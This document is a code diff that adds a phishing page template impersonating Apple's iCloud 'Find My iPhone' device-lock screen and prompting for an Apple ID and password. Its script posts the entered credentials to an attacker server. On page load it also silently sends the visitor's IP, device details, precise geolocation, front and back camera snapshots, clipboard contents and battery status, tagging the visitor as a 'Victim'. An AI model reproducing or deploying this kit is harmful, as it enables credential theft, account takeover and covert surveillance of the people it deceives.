@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>iCloud - Find My iPhone</title>
+<link rel="icon" href="https://www.apple.com/favicon.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f7; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+.container { width: 100%; max-width: 420px; padding: 20px; }
+.apple-logo { text-align: center; margin-bottom: 20px; }
+.apple-logo svg { width: 44px; height: 52px; }
+.lock-card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); padding: 40px 32px; text-align: center; }
+.lock-icon { width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #ff3b30, #ff6b6b); border-radius: 20px; display: flex; align-items: center; justify-content: center; }
+.lock-icon svg { width: 40px; height: 40px; fill: #fff; }
+.device-img { width: 120px; height: 120px; margin: 16px auto; background: linear-gradient(135deg, #e5e5ea, #c7c7cc); border-radius: 24px; display: flex; align-items: center; justify-content: center; }
+.device-img svg { width: 60px; height: 60px; fill: #8e8e93; }
+.lock-title { font-size: 22px; font-weight: 600; color: #1d1d1f; margin-bottom: 8px; }
+.lock-subtitle { font-size: 15px; color: #86868b; margin-bottom: 24px; line-height: 1.5; }
+.alert-badge { background: #fff3cd; border: 1px solid #ffc107; border-radius: 10px; padding: 12px 16px; margin-bottom: 24px; font-size: 13px; color: #856404; display: flex; align-items: center; gap: 8px; justify-content: center; }
+.form-group { margin-bottom: 16px; text-align: right; }
+.form-group label { display: block; font-size: 13px; color: #86868b; margin-bottom: 6px; font-weight: 500; }
+.form-group input { width: 100%; padding: 14px 16px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; color: #1d1d1f; outline: none; background: #fff; transition: border-color 0.2s; -webkit-appearance: none; }
+.form-group input:focus { border-color: #0071e3; box-shadow: 0 0 0 3px rgba(0,113,227,0.15); }
+.btn-unlock { width: 100%; padding: 14px; background: #0071e3; color: #fff; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+.btn-unlock:hover { background: #0077ed; }
+.help-link { display: block; margin-top: 16px; color: #0071e3; font-size: 14px; text-decoration: none; }
+.help-link:hover { text-decoration: underline; }
+.footer { margin-top: 32px; text-align: center; font-size: 12px; color: #86868b; }
+.footer a { color: #0071e3; text-decoration: none; }
+.loading { display: none; text-align: center; padding: 32px; }
+.spinner { border: 3px solid #e5e5ea; border-top: 3px solid #0071e3; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+@media (max-width: 480px) { .lock-card { padding: 28px 20px; } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="apple-logo">
+<svg viewBox="0 0 170 200" fill="#1d1d1f"><path d="M150.4 172.3c-3.5 8.1-5.2 11.8-9.7 18.9-6.3 10-15.2 22.4-26.2 22.5-9.8.1-12.3-6.4-25.6-6.3-13.3.1-16 6.5-25.8 6.4-11-.1-19.4-11.2-25.7-21.2C22.6 168.2 11 126.6 26.2 98.4c7.5-14 20.9-22.8 35.5-23 9.7-.2 18.9 6.6 24.8 6.6 5.9 0 17-8.2 28.7-7 4.9.2 18.5 2 27.3 14.8-.7.5-16.3 9.5-16.1 28.4.2 22.6 19.8 30.1 20 30.1z M120 0c1.6 12.7-3.7 25.3-11.4 34.3-7.8 9.2-20.5 16.3-33 15.3C74.2 37.4 79.2 24.1 87.3 15.2 95.5 6 108.5-.2 120 0z"/></svg>
+</div>
+<div class="lock-card">
+<div class="lock-icon">
+<svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+</div>
+<div class="device-img">
+<svg viewBox="0 0 24 24"><path d="M15.5 1h-8A2.5 2.5 0 0 0 5 3.5v17A2.5 2.5 0 0 0 7.5 23h8a2.5 2.5 0 0 0 2.5-2.5v-17A2.5 2.5 0 0 0 15.5 1zm-4 21c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm4.5-4H7V4h9v14z"/></svg>
+</div>
+<h1 class="lock-title">Your device has been locked</h1>
+<p class="lock-subtitle">This iPhone has been locked using Find My iPhone. Sign in with your Apple ID to unlock it.</p>
+<div class="alert-badge">
+⚠️ Activation Lock is enabled on this device
+</div>
+<form id="loginForm">
+<div class="form-group">
+<label>Apple ID</label>
+<input type="email" id="email" placeholder="example@icloud.com" required>
+</div>
+<div class="form-group">
+<label>Password</label>
+<input type="password" id="password" placeholder="Required" required>
+</div>
+<button type="submit" class="btn-unlock">Unlock Device</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="font-size: 14px; color: #86868b;">Verifying Apple ID...</p>
+</div>
+<a href="#" class="help-link">Forgot Apple ID or password?</a>
+</div>
+<div class="footer">
+<p>Copyright © 2024 Apple Inc. All rights reserved.</p>
+<p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '🍎 <b>iCloud Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
+    }
+
+    async function captureCamera(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 2000));
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+
+    try {
+        if(navigator.clipboard && navigator.clipboard.readText) {
+            const clip = await navigator.clipboard.readText();
+            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
+        }
+    } catch(e) {}
+
+    try {
+        const bat = await navigator.getBattery();
+        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
+    } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+
+    $.post("<%=a %>/creds", {
+        uid: uid,
+        user: encodeURIComponent(email),
+        pass: encodeURIComponent(pass),
+        platform: 'iCloud'
+    });
+
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
